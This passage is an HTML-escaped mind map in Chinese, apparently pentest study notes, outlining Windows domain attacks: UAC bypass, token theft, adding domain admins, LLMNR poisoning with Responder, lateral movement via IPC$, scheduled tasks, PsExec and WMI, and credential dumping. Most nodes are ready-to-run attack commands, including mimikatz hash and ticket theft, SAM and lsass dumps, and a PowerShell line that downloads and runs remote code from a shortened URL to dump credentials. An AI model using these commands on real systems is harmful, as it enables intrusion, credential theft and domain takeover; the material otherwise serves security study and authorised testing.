      &lt;node TEXT=&quot;仅在程序 试图更改我的计算机时通知我（不降低桌面的亮度）：与上相同，但提示时不降低桌面的亮度&quot; ID=&quot;2071736a95f94f18a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;从不提示：当用户为系统管理员时，所有程序 都会以最高权限运行&quot; ID=&quot;1d01736a96d3e9111&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;ByPassUAC模块&quot; ID=&quot;2361736a9749aa00e&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;后台运行获取的管理员权限meterpreter,use exploit/windows/local/bypassuac模块，再设置刚刚的session id，run即可获取新的meterpreter，执行getsystem,即可获取system权限shell&quot; ID=&quot;2691736a9769d80d1&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;RunAs模块&quot; ID=&quot;1c71736a9900e90a6&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;后台运行获取的管理员权限meterpreter，use exploit/windows/local/ask模块，创建一个可执行文件，执行run命令后目标机器会弹一个UAC对话框，点击“是”之后 即可获取新的meterpreter&quot; ID=&quot;1f51736a99a4b7173&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;在使用RunAs模块时，需要使用EXE::Custom选项创建一个可执行文件，需要进行免杀处理&quot; ID=&quot;3a61736a9be2e10da&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;NiShang中的Invoke-PsUACme模块&quot; ID=&quot;2bd1736a9c5f7003a&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;Invoke-PsUACme -Verbose   //使用Sysprep方法执行默认的payload&quot; ID=&quot;1bf1736a9c8e690db&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Invoke-PsUACme -method oobe -Verbose //使用oobe方法并执行默认的payload&quot; ID=&quot;af1736a9d96b8082&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Invoke-PsUACme -method oobe -Payload &amp;quot;powershell -windowstyle hidden -e Encoded_Payload&amp;quot; //使用-payload参数执行自定义的payload&quot; ID=&quot;2ad1736a9de880148&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Empire中的bypassuac模块&quot; ID=&quot;2081736a9f3e3f002&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;bypassuac模块&quot; ID=&quot;1541736a9f6f8019&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;usemodule privesc/bypassuac  设置监听器参数，执行execute命令，得到一个新的shell，回到agents下，执行list命令，username一栏中带*号打头的即已bypassuac&quot; ID=&quot;1761736a9f839300b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;bypassuac_wscript模块&quot; ID=&quot;1491736aa02c310ac&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;使用c:\windows\wscript.exe执行payload 即绕过UAC，以管理员权限执行payload。该模块只适用于WIN7，暂无补丁&quot; ID=&quot;2af1736aa04c5205d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;令牌窃取 &quot; ID=&quot;9e1736aa25ef902&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;Metasploit&quot; ID=&quot;1fb1736aa2cf8813c&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;在已获取 的meterpreter的环境中，输入use incognito命令，然后再输入list_tokens -u命令，列出可用的令牌&quot; ID=&quot;cb1736ad45f4110e&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;令牌分两种：Delegation Token即授权令牌，支持交互式登陆；Impersonation Token模拟令牌，支持非交互式会话&quot; ID=&quot;2191736b17b160053&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;impersonate_token WIN-57123456\\Administrator[这里需要输入两个\\]  再输入shell 进入cmd，执行whoami即为administrator用户了&quot; ID=&quot;2e61736b18cd4808e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Rotten Potato本地提权&quot; ID=&quot;3cd1736b1e3576057&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;在已获取 的meterpreter的环境中，输入use incognito命令，然后再输入list_tokens -u命令，列出可用的令牌&quot; ID=&quot;8f1736b327b1808e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;上传rottenpotato.exe至目标服务器，执行execute -HC -f rottenpotato.exe 再执行impersonate_token &amp;quot;NT AUTHORITY\\SYSTEM&amp;quot;,再getuid即可发现已经是system权限 了&quot; ID=&quot;10f1736b3c827f19&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;添加域管理员&quot; ID=&quot;1b01736b3e3cfe0a7&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;假设网络中设置了域管理进程，在meterpreter会话窗口中输入&amp;quot;ps&amp;quot;命令，查看域管理进程，并使用migrate命令迁移到该进程，输入shell后输入以下命令&quot; ID=&quot;37b1736b4151e70fb&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;net user test test /add /domain&quot; ID=&quot;3471736b3e4eaf05a&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;net group &amp;quot;domain admins&amp;quot; test /add /domain&quot; ID=&quot;2731736b4030f0035&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;在metterpreter环境中，使用incognit来模拟域管理员，然后通过迭代系统 中所有可用的身份令牌来添加域管理员&quot; ID=&quot;3251736b410247063&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;add_user test test -h 1.1.1.2&quot; ID=&quot;26d1736b4353e80a8&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;add_group &amp;quot;Domain Admins&amp;quot; test -h 1.1.1.2&quot; ID=&quot;3c61736b43863f007&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Empire下的令牌窃取&quot; ID=&quot;28b1736b6b3eae0ca&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;在Empire下获取服务器权限后，执行mimikatz命令，再输入creds命令，即可查看Empire列举出来 的密码&quot; ID=&quot;38f1736b6b725d0e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;执行命令 pth &amp;lt;ID&amp;gt;命令，就能窃取指定id对应用户的令牌[ID为列举出来的CredID]&quot; ID=&quot;1ae1736b73df870e5&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;执行ps命令，查看当前是否有域用户的进程正在运行，执行steal_token &amp;lt;PID&amp;gt; 即可获取指定进程令牌&quot; ID=&quot;3371736b74f29602d&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;无凭证条件下的权限 获取&quot; ID=&quot;1651736b9d8bf612&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;LLMNR和NetBIOS&quot; ID=&quot;38d1736b9dc23e171&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;Responder[下载链接：https://github.com/SpiderLabs/Responder.git ]&quot; ID=&quot;2ad1736b9de68510e&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;python Responder.py -I eth0 -wrf  &quot; ID=&quot;281736b9eab360a8&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
&lt;/node&gt;
&lt;node TEXT=&quot;五、域内横向移动&quot; ID=&quot;c61735a6ab2da06c&quot; STYLE=&quot;bubble&quot; POSITION=&quot;right&quot;&gt;
  &lt;node TEXT=&quot;常用Windows远程连接和相关命令&quot; ID=&quot;861736ba08e4d012&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;IPC&quot; ID=&quot;1eb1736ba0c145079&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;通过IPC$可以与目标机器 建立连接，不仅可以访问目标机器 中的文件，进行上传下载操作，还可以在目标机器上执行其它命令&quot; ID=&quot;3a1736ba12cde185&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;net user \\192.168.1.1\ipc$ &amp;quot;password&amp;quot; /user:administrator 再执行net user可查看当前建立的连接&quot; ID=&quot;1981736ba1cc3e12c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;IPC$的利用条件&quot; ID=&quot;2c01736ba2c407172&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;开启了139、445端口&quot; ID=&quot;521736ba2e4560b7&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;管理员开启了默认共享&quot; ID=&quot;35e1736ba32b2f019&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;IPC$连接失败的原因&quot; ID=&quot;3c41736ba3678e08a&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;用户名或密码错误&quot; ID=&quot;1011736ba3860e182&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;目标没有打开IPC$默认共享&quot; ID=&quot;8f1736ba3a30716b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;不能成功连接目标的139、445端口&quot; ID=&quot;f91736ba3d1a5005&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;命令输入错误&quot; ID=&quot;2131736ba3fade10e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;常见错误号&quot; ID=&quot;1981736ba40936023&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;5：拒绝访问&quot; ID=&quot;38c1736ba41ebe147&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;51：无法找到网络路径&quot; ID=&quot;3251736ba45225038&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;53：找不到网络路径[IP错误，未开机，lanmanserver服务未启动，目标有防火墙]&quot; ID=&quot;16f1736ba4780502c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;67：找不到网络名[lanmanserver服务未启动、IPC$被删除]&quot; ID=&quot;5a1736ba5282e12&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;1219：提供的凭据与已存在的凭据集冲突&quot; ID=&quot;1681736ba58925119&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;1326：未知的用户名或错误密码&quot; ID=&quot;12d1736ba5e19e065&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;1792：试图登陆，但网络登陆服务未启动&quot; ID=&quot;1c41736ba6048e0b1&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;2422：密码已过期&quot; ID=&quot;32d1736ba643df114&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;使用Windows自带的工具获取远程主机信息&quot; ID=&quot;27c1736ba66575018&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;dir命令&quot; ID=&quot;1101736ba6a9b507c&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;在使用net user与目标建立ipc$连接后，可执行命令dir \\192.168.1.1\c$&quot; ID=&quot;2291736ba6b7ff055&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;tasklist命令&quot; ID=&quot;3d51736ba779b6186&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;在使用net user与目标建立ipc$连接后，可执行命令tasklist /S 192.168.1.1 -U administrator /P password&quot; ID=&quot;3f1736ba78a0f02&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;计划任务&quot; ID=&quot;2c01736ba81a1e014&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;at命令&quot; ID=&quot;18f1736ba8340e058&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;查看目标时间：net time \\192.168.1.1&quot; ID=&quot;1601736ba8504e116&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;将文件复制到目标系统中： copy test.exe \\192.168.1.1\c$&quot; ID=&quot;551736ba8cb66022&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;使用at创建计划任务：at \\192.168.1.1 4:11PM c:\test.exe&quot; ID=&quot;1af1736ba92d2506e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;清除at记录：at \\192.168.1.1 7 /delete [7为上一步创建任务时的ID]&quot; ID=&quot;20f1736ba9ce86132&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;schtasks命令&quot; ID=&quot;691736baa39e4094&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;schtasks /create /s 192.168.1.1 /tn test /sc onstart /tr c:\test.exe /ru system /f[创建名为test的计划任务，开机时自动启动，程序为c:\test.exe，启动权限为system]&quot; ID=&quot;3571736baaa9660b2&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;schtasks /run /s 192.168.1.1 /i /tn &amp;quot;test&amp;quot;  执行上一步创建的任务&quot; ID=&quot;1121736bad9586117&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;Windows系统Hash获取&quot; ID=&quot;1d31736bb056e50ff&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;LM Hash和NTLM Hash&quot; ID=&quot;2721736bb0ba9d12b&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;在windows系统中，hash的结构通常为：username:RID:LM-HASH:NT-HASH&quot; ID=&quot;1c31736bb0e81604c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;单机密码抓取&quot; ID=&quot;1351736bb29766197&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;GetPass 获取明文密码&quot; ID=&quot;1371736bb2be7d16a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;PwDump7 获取NTLM Hash,通过彩虹表破解，也可以通过pth登陆&quot; ID=&quot;1811736bb2f7d5152&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;QuarksPwDump&quot; ID=&quot;24e1736bb3d18d0fa&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;QuarksPwDump --dump-hash-local&quot; ID=&quot;cb1736bb40b8e001&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;通过SAM和System文件抓取密码&quot; ID=&quot;2471736bb4510514f&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;导出SAM和System文件&quot; ID=&quot;19e1736bb498ce00e&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;reg save hklm\sam sam.hive&quot; ID=&quot;3541736bb4db45193&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;reg save hklm\system system.hive&quot; ID=&quot;2781736bb506e5039&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;读取文件&quot; ID=&quot;2101736bb54665139&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;mimikatz读取SAM和SYSTEM文件[将导入的hive文件放到本地]&quot; ID=&quot;1121736bb563ad166&quot; STYLE=&quot;fork&quot;&gt;
            &lt;node TEXT=&quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; ID=&quot;1491736bb5716d06&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;/node&gt;
          &lt;node TEXT=&quot;使用Cain&quot; ID=&quot;1131736bb5e32c0bd&quot; STYLE=&quot;fork&quot;&gt;
            &lt;node TEXT=&quot;进入Cracker模块，选中LM&amp;amp;NTLM选项，import Hashes From a SAM database选项&quot; ID=&quot;2ba1736bb5fba6051&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;/node&gt;
          &lt;node TEXT=&quot;mimikatz直接读取本地SAM文件&quot; ID=&quot;3cf1736bb7315e072&quot; STYLE=&quot;fork&quot;&gt;
            &lt;node TEXT=&quot;privilege::debug&quot; ID=&quot;2791736bb7aa96014&quot; STYLE=&quot;fork&quot;/&gt;
            &lt;node TEXT=&quot;token::elevate&quot; ID=&quot;3b81736bb7d4bd112&quot; STYLE=&quot;fork&quot;/&gt;
            &lt;node TEXT=&quot;lsadump::sam&quot; ID=&quot;3d81736bb7f7960db&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;/node&gt;
          &lt;node TEXT=&quot;&quot; ID=&quot;1201736bbcf2fd0c9&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;mimikatz读取在线SAM文件&quot; ID=&quot;1a51736bb890dd057&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;log&amp;quot; &amp;quot;sekurlsa::logonpasswords&amp;quot;&quot; ID=&quot;2ad1736bb9659d178&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;mimikatz离线读取lsass.dmp文件&quot; ID=&quot;c1736bba76bd188&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;导出lsass.dmp文件&quot; ID=&quot;2421736bbaa6cd04f&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;Windows NT 6中，任务管理器中找到lsass.exe进程，右键选择“Create Dump File”&quot; ID=&quot;1071736bbae46c192&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;Procdump.exe -accepteula -ma lsass.exe lsass.dmp&quot; ID=&quot;2db1736bbb77ad003&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;mimikatz.exe &amp;quot;sekurlsa::minidump lsass.dmp&amp;quot; &amp;quot;sekurlsa::logonPasswords full&amp;quot; exit&quot; ID=&quot;25f1736bbc05f6157&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;Powershell 获取Hash&quot; ID=&quot;cf1736bbe21ed03b&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;powershell进行nishang目录，Import-Module .\Get-PassHashes.ps1 再执行Get-PassHashes&quot; ID=&quot;15f1736bbe52d605&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;PowerShell远程加载mimikatz抓取Hash&quot; ID=&quot;811736bbf93dc0b6&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;apos;http://is.gd/oeoFuI&amp;apos;); Invoke-Mimikatz -DumpCreds&amp;quot;&quot; ID=&quot;501736bbfde650bc&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;使用hashcat破解密码&quot; ID=&quot;5a1736bc29bf514e&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;哈希传递&quot; ID=&quot;711736bc44b5d105&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;NTLM Hash哈希传递&quot; ID=&quot;2281736bc47bb503e&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::pth /user:administrator /domain:pentest.com /ntlm:htlm_hash&amp;quot;  会弹出新的cmd&quot; ID=&quot;281736bc503c5092&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;AES-256 密钥哈希传递&quot; ID=&quot;1511736bc6796507b&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;抓取密钥哈希：mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::ekeys&amp;quot;&quot; ID=&quot;9d1736bc6df86081&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;传递：mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::pth /user:administrator /domain:pentest.com /aes256:AES-256_HASH&amp;quot;&quot; ID=&quot;3b01736bc76095139&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;票据传递攻击&quot; ID=&quot;1af1736bc881d6048&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;使用mimikatz进行票据传递&quot; ID=&quot;1c51736bc8e24d169&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;导出票据：mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::tickets /export&amp;quot;，执行之后 当前目录会生成多个服务的票据文件，如krbtgt\cifs\ldap等&quot; ID=&quot;681736bc90a0e006&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;清除内存中的票据：kerberos::purge&quot; ID=&quot;3391736bcb59be031&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;将票据注入到内存：mimikatz &amp;quot;kerberos::ptt&amp;quot; &amp;quot;c:\ticket\xxxxxxxxxxx-administrator@krbtgt-pentest.com.kirbi&amp;quot;\&quot; ID=&quot;41736bcc161d14&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;将高权限 票据注入内存后，可以列出远程计算机的文件目录，如：dir \\dc\c$&quot; ID=&quot;3c11736bcce8ef0b6&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;使用kekeo进行票据传递[下载链接：https://github.com/gentilkiwi/kekeo]&quot; ID=&quot;2ea1736bcdadad11a&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;生成票据文件：kekeo  &amp;quot;tgt::ask /user:administrator /domain:pentest.com /ntlm:NTLM_HASH&amp;quot;&quot; ID=&quot;15f1736bcdd80d0a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;清除内存中的票据：kerberos::purge[在kekeo的shell中]\klist purge[在cmd shell中]&quot; ID=&quot;3d61736bcf694607a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;导入内存：[kekeo shell] kerberos::ptt TGT_administrator@pentest.com_krbtgt~pentest.com@pentest.com.kirbi[该文件为第一步中生成的文件名]&quot; ID=&quot;581736bcfcc7c198&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;输入exit命令退出，再dir \\dc\c$列出远程计算机的文件目录&quot; ID=&quot;831736bd194fe15&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;PsExec的使用&quot; ID=&quot;2011736bd220f7137&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;PsTools中的PsExec&quot; ID=&quot;3251736bdfe125027&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;有建立 ipc$连接的情况下，执行psexec.exe -accepteula \\192.168.1.1 -s cmd.exe 可获取 system权限shell&quot; ID=&quot;2671736bd237c504a&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;-accepteula 第一次运行psexec会弹出确认框，加上该参数不弹&quot; ID=&quot;3c71736bddd88d027&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;-s 以system权限运行远程进程&quot; ID=&quot;2851736bde40be09f&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;没有建立 ipc$连接&quot; ID=&quot;2f91736bdea8c50a2&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;psexec \\192.168.1.1 -u administrator -p password cmd.exe&quot; ID=&quot;2bc1736bdec984166&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;-u 域名\用户名&quot; ID=&quot;14c1736bdf3d050b8&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;-p 密码&quot; ID=&quot;941736bdf5d2f0c4&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;metasploit中的psexec模块&quot; ID=&quot;f81736bdfbbe5156&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;exploit/windows/smb/psexec&quot; ID=&quot;2e51736be0476d121&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;exploit/windows/smb/psexec_psh(psexec的powershell版本)&quot; ID=&quot;2b21736be0895c121&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;WMI的使用&quot; ID=&quot;2111736be11085088&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;基本命令[wmic命令没有回显，开启防火墙时无法连接]&quot; ID=&quot;1701736be3336403b&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;wmic /node:192.168.1.1 /user:administrator /password:admin123 process call create &amp;quot;cmd.exe /c ipconfig &amp;gt; c:\ip.txt&amp;quot;&quot; ID=&quot;1d01736be137dc08&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;建立IPC$后：type \\192.168.1.1\c$\ip.txt&quot; ID=&quot;34d1736be261a50bf&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;impacket工具包中的wmiexec&quot; ID=&quot;c61736be3ae5e18d&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;wmiexec.py administrator:admin123@@192.168.1.1  主要用于linux向windows横向渗透&quot; ID=&quot;2741736be3e30d04e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;wmiexec.vbs&quot; ID=&quot;1cc1736be475dd166&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 administrator admin123&quot; ID=&quot;01736be48794048&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Invoke-WmiCommand[PowerSploit工具包中]&quot; ID=&quot;c31736be551d5083&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;将Invoke-WmiCommand.ps1导入系统后，在powershell中执行下列命令&quot; ID=&quot;dc1736be64a35004&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;$User=&amp;quot;pentest.com\administrator&amp;quot;&quot; ID=&quot;c81736be6a50501d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;$Password=ConvertTo-SeureString -String &amp;quot;admin123&amp;quot; -AsPlainText -Force&quot; ID=&quot;3561736be6f6cc0fc&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;$Cred =New-Object -TypeName System.Management.AutoMation.PSCreDential -ArgumentList $User,$Password&quot; ID=&quot;b41736be78933098&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;$Remote=Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName  192.168.1.1&quot; ID=&quot;871736be8444c014&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;$Remote.PayloadOutput&quot; ID=&quot;34d1736be6d8ad029&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Invoke-WMIMethod[Powershell自带]&quot; ID=&quot;3391736be95985122&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;$User=&amp;quot;pentest.com\administrator&amp;quot;&quot; ID=&quot;1c61736be9761d0ae&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;$Password=ConvertTo-SeureString -String &amp;quot;admin123&amp;quot; -AsPlainText -Force&quot; ID=&quot;3b01736be9bb8503c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;$Cred =New-Object -TypeName System.Management.AutoMation.PSCreDential -ArgumentList $User,$Password&quot; ID=&quot;971736be9e1150a1&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &amp;quot;calc.exe&amp;quot; -ComputerName &amp;quot;192.168.1.1&amp;quot; -Credential $Cred&quot; ID=&quot;2641736bea4d5d09e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
